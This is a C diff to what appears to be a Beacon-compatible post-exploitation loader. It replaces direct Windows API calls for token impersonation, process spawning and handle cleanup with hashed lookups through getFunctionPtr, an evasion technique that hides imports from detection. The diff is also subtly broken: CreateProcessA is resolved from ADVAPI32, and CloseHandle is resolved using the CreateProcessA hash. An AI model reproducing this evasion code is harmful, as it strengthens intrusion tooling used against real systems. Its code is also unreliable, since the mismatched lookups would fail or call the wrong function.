@@ -10,6 +10,7 @@
 #include <stdlib.h>
 #include <stdint.h>
 #include <stdarg.h>
+#include "APIResolve.h"
 #ifdef _WIN32
 #include <windows.h>
 
@@ -255,12 +256,14 @@ void BeaconOutput(int type, char* data, int len) {
 
 BOOL BeaconUseToken(HANDLE token) {
     /* Probably needs to handle DuplicateTokenEx too */
-    SetThreadToken(NULL, token);
+    tSetThreadToken _SetThreadToken = (tSetThreadToken)getFunctionPtr(HASH_ADVAPI32, HASH_SetThreadToken);
+    _SetThreadToken(NULL, token);
     return TRUE;
 }
 
 void BeaconRevertToken(void) {
-    if (!RevertToSelf()) {
+    tRevertToSelf _RevertToSelf = (tRevertToSelf)getFunctionPtr(HASH_ADVAPI32, HASH_RevertToSelf);
+    if (!_RevertToSelf()) {
 #ifdef DEBUG
         printf("RevertToSelf Failed!\n");
 #endif
@@ -304,12 +307,14 @@ void BeaconGetSpawnTo(BOOL x86, char* buffer, int length) {
 }
 
 BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO * sInfo, PROCESS_INFORMATION * pInfo) {
+    tCreateProcessA _CreateProcessA = (tCreateProcessA)getFunctionPtr(HASH_ADVAPI32, HASH_CreateProcessA);
+
     BOOL bSuccess = FALSE;
     if (x86) {
-        bSuccess = CreateProcessA(NULL, (char*)"C:\\Windows\\"X86PATH"\\"DEFAULTPROCESSNAME, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
+        bSuccess = _CreateProcessA(NULL, (char*)"C:\\Windows\\"X86PATH"\\"DEFAULTPROCESSNAME, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
     }
     else {
-        bSuccess = CreateProcessA(NULL, (char*)"C:\\Windows\\"X64PATH"\\"DEFAULTPROCESSNAME, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
+        bSuccess = _CreateProcessA(NULL, (char*)"C:\\Windows\\"X64PATH"\\"DEFAULTPROCESSNAME, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
     }
     return bSuccess;
 }
@@ -325,8 +330,10 @@ void BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload, int
 }
 
 void BeaconCleanupProcess(PROCESS_INFORMATION* pInfo) {
-    (void)CloseHandle(pInfo->hThread);
-    (void)CloseHandle(pInfo->hProcess);
+    tCloseHandle _CloseHandle = (tCloseHandle)getFunctionPtr(HASH_ADVAPI32, HASH_CreateProcessA);
+    
+    (void)_CloseHandle(pInfo->hThread);
+    (void)_CloseHandle(pInfo->hProcess);
     return;
 }
 
